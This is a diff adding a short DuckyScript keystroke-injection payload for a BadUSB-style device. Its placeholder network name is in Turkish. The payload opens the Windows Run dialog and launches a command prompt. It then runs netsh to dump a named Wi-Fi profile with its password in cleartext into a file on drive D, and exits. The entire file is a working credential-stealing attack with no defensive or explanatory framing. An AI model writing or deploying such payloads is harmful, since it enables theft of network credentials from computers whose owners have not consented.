@@ -1,0 +1,14 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING cmd
+DELAY 1000
+ENTER
+DELAY 5000
+STRING netsh wlan show profile name="HEDEF AĞ ADRESİNİN İSMİ" key=clear > D:\yaz.txt
+DELAY 1000
+ENTER
+DELAY 5000
+STRING exit
+DELAY 1000
+ENTER
